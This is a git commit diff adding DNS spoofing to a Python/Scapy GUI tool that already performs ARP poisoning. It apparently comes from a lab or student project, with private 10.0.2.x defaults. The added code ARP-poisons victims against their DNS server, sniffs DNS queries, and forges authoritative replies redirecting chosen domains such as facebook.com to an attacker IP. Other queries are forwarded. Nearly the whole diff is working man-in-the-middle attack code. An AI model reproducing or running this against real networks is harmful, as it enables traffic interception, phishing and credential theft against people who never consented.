7791276cec22dc20d4ed06af47d1464888e552b6
Stefan <stefan.friptu@uipath.com>
2020-04-12 00:09:34 +0200

    Added dns spoofing

--- live.py
+++ live.py
@@ -7,7 +7,7 @@ import time
 def GetMacFromIp(targetip):
     arppacket= Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 1, pdst = targetip)
     try:
-        targetmac= srp(arppacket, timeout=2 , verbose= False, iface = "enp0s3")[0][0][1].hwsrc
+        targetmac= srp(arppacket, timeout=2 , verbose= False, iface = "enp0s8")[0][0][1].hwsrc
         return targetmac
     except:
             print("WARNING: Host " + str(targetip) + " unreachable.");
@@ -37,6 +37,15 @@ class Application(Frame):
         self.capture_t = threading.Thread(target = self.capture_packets)
         self.capture_t.daemon = True
         self.capture_t.killed = False
+
+        self.spoof_t = threading.Thread(target = self.spoof, args = (0, 0))
+        self.spoof_t.daemon = True
+        self.spoof_t.killed = False
+
+        self.dnsarp_t = threading.Thread(target = self.arp_poison_dns)
+        self.dnsarp_t.daemon = True
+        self.dnsarp_t.killed = False
+        
         
         # Create interface
         self.grid_columnconfigure(2, minsize = 120)
@@ -46,8 +55,11 @@ class Application(Frame):
         self.stoparp = Button(self, text = "Stop poisoning", state = 'disabled', command = self.stopArp)
         self.stoparp.grid(row = 22, column = 0)
 
-        self.dns = Button(self, text = "DNS Spoofing") # command = self.start dns
+        self.dns = Button(self, text = "DNS Spoofing", command = self.startDns)
         self.dns.grid(row = 20, column = 5)
+
+        self.stopdns = Button(self, text = "Stop spoofing", state = 'disabled', command = self.stopDns)
+        self.stopdns.grid(row = 22, column = 5)
 
         self.uExitButton = Button(self, text = "Save pcap and exit", command = self.exit)
         self.uExitButton.grid(row = 25, column = 2)
@@ -75,21 +87,25 @@ class Application(Frame):
 
         # Configure field victim's ip for DNS attack
         self.uDnsEntryIpVictim = Entry(self)
+        self.uDnsEntryIpVictim.insert(END, "10.0.2.5")
         self.uDnsEntryIpVictim.grid(row = 2, column = 5)
 
         self.uDnsEntryDomains = Entry(self)
+        self.uDnsEntryDomains.insert(END, "facebook.com")
         self.uDnsEntryDomains.grid(row = 6, column = 5)
 
         self.uDnsEntryIpRedirect = Entry(self)
+        self.uDnsEntryIpRedirect.insert(END, "10.0.2.6")
         self.uDnsEntryIpRedirect.grid(row = 10, column = 5)
 
         self.uDnsEntryIpDNS = Entry(self)
+        self.uDnsEntryIpDNS.insert(END, "10.0.2.1")
         self.uDnsEntryIpDNS.grid(row = 14, column = 5)
         
         
         # Configure self
         self.interceptedPackets = []
-        self.networkInterface = "enp0s3"
+        self.networkInterface = "enp0s8"
         self.selfMac = get_if_hwaddr(self.networkInterface)
         self.selfIp = "192.168.56.103"
         
@@ -101,14 +117,13 @@ class Application(Frame):
         self.victimIp  = self.victimIp.split(',')
 
         self.victimMac, self.serverMac = [], []
-
-        for index in range(0, len(self.victimIp)):
-            self.victimMac.append(GetMacFromIp(self.victimIp[index]))
+        for i in range(0, len(self.victimIp)):
+            self.victimMac.append(GetMacFromIp(self.victimIp[i]))
 
         self.serverIp = self.uArpEntryIpServer.get()
         self.serverIp = self.serverIp.split(',')
-        for index in range(0, len(self.serverIp)):
-            self.serverMac.append(GetMacFromIp(self.serverIp[index]))
+        for i in range(0, len(self.serverIp)):
+            self.serverMac.append(GetMacFromIp(self.serverIp[i]))
         
         # start a sepparate thread for continously poisoning the targets
         self.poison_t.start()
@@ -116,13 +131,93 @@ class Application(Frame):
         # start capturing thread
         self.capture_t.start()
 
+    def startDns(self):
+        self.dns['state'] = 'disabled'
+        self.stopdns['state'] = 'normal'
+        
+        self.dnsVictimIp = self.uDnsEntryIpVictim.get()
+        self.dnsVictimIp = self.dnsVictimIp.split(',')
+
+        self.dnsDomains = self.uDnsEntryDomains.get()
+        self.dnsDomains = self.dnsDomains.split(',')
+
+        self.dnsIpRedirects = self.uDnsEntryIpRedirect.get()
+        self.dnsIpRedirects = self.dnsIpRedirects.split(',')
+
+        self.dnsServerIp = self.uDnsEntryIpDNS.get()
+        self.dnsServerIp = self.dnsServerIp.split(',')
+
+        self.dnsVictimMac = []
+        for i in range(0, len(self.dnsVictimIp)):
+            self.dnsVictimMac.append(GetMacFromIp(self.dnsVictimIp[i]))
+
+        self.spoof_t = threading.Thread(target = self.spoof, args = (self.dnsDomains, self.dnsServerIp))
+        self.spoof_t.daemon = True
+        self.spoof_t.killed = False
+        
+        self.spoof_t.start()
+
+        self.dnsarp_t.start()
+        
+            
     def stopArp(self):
-        print "[ARP] Sending stop signal to threads"
+        print "[ARP] Sending stop signal to threads... 1 request needed to kill the threads."
         self.poison_t.killed = True
         self.capture_t.killed = True
         self.arp['state'] = 'normal'
         self.stoparp['state'] = 'disabled'
-     
+
+    def stopDns(self):
+        print "[DNS] Stopping DNS spoofing... 1 request needed to kill the threads."
+        self.spoof_t.killed = True
+        self.dnsarp_t.killed = True
+        self.dns['state'] = 'normal'
+        self.stopdns['state'] = 'disabled'
+
+    def spoof(self, sites, dnsserver):
+
+        def dnsAction():
+            if self.spoof_t.killed == True:
+                self.poison_t.killed = False
+                print "[DNS] Stopping dns spoofing..."
+                raise SystemExit()
+            
+            def forward(pkt):
+                print "[DNS] Forwarding: " + pkt[DNSQR].qname
+                resp = sr1(IP(dst = '8.8.8.8')/UDP(sport = pkt[UDP].sport)/DNS(rd = 1, id = pkt[DNS].id, qd = DNSQR(qname = pkt[DNSQR].qname)), verbose = False)
+                resp_pkt = IP(dst = pkt[IP].src, src = dnsserver[0])/UDP(dport = pkt[UDP].sport)/DNS()
+                resp_pkt[DNS] = resp[DNS]
+                send(resp_pkt, verbose = 0, iface = self.networkInterface)
+                print "[DNS] Responding to " + pkt[IP].src
+        
+            def get(pkt):
+                if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
+                    for i in range (0, len(sites)):
+                        site = sites[i]
+                        if pkt[DNSQR].qname[len(pkt[DNSQR].qname) - 1] == ".":
+                            pkt["DNS Question Record"].qname = pkt["DNS Question Record"].qname[0 : len(pkt["DNS Question Record"].qname) - 1]
+                        if str(pkt["DNS Question Record"].qname) in site:
+                            redirect = self.dnsIpRedirects[i] if len(self.dnsIpRedirects) < i else self.dnsIpRedirects[0]
+                            resp_pkt = IP(dst=pkt[IP].src, src = pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa=1, qr=1, an = DNSRR(rrname=pkt[DNS].qd.qname, ttl = 100, rdata=redirect))
+                            send(resp_pkt, verbose = False, iface = self.networkInterface)
+                            return "[DNS] Spoofed DNS response sent - redirected " + site + " to " + redirect + " for client: " + pkt[IP].src
+                    return forward(pkt)
+            return get
+
+        sniff(filter = "udp port 53 and ip dst 8.8.8.8", prn = dnsAction(), iface = self.networkInterface)
+
+    def arp_poison_dns(self):
+        while True:
+            for i in range(0, len(self.dnsVictimIp)):
+                for j in range(0, len(self.dnsServerIp)):
+                    if self.dnsarp_t.killed == True:
+                        self.dnsarp_t.killed = False;
+                        print "[DNS] Stopping arp poisoning..."
+                        raise SystemExit()
+                    packet = GeneratePacket(self.selfMac, self.dnsServerIp[j], self.dnsVictimMac[i], self.dnsVictimIp[i])
+                    sendp(packet, iface = self.networkInterface)
+                time.sleep(10)
+                    
     def arp_poison(self):
         while True:
             for i in range(0, len(self.victimIp)):
@@ -168,7 +263,6 @@ class Application(Frame):
     def capture_packets(self):
         print "[ARP] Forwarding and saving TCP packets..."
         sniff(lfilter = self.TCPFilter, prn = self.interceptAndForward, iface = self.networkInterface)
-        
     
     def exit(self):
         if len(self.interceptedPackets) > 0:
